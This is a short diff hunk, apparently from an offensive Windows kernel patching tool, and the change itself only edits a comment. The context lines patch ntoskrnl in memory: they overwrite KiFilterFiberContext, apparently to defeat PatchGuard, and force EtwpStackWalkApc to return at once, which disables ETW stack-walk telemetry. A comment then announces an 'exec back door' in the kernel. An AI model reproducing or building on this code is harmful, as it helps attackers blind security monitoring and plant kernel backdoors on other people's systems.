@@ -125,7 +125,7 @@ int main()
 	//patch KiFilterFiberContext (ntoskrnl)
 	memcpy(RVA_VA(ntoskrnlBuff, (uint64_t)KiFilterFiberContextOff), asmpatch, sizeof(asmpatch));
 
-	//patch EtwpTraceStackWalk (ntoskrnl) //sit d0g!!1
+	//patch EtwpStackWalkApc (ntoskrnl) //sit d0g!!1
 	*(uint8_t*)RVA_VA(ntoskrnlBuff, (uint64_t)EtwpStackWalkApcOff) = 0xC3;
 
 	//add exec back door (ntoskrnl)
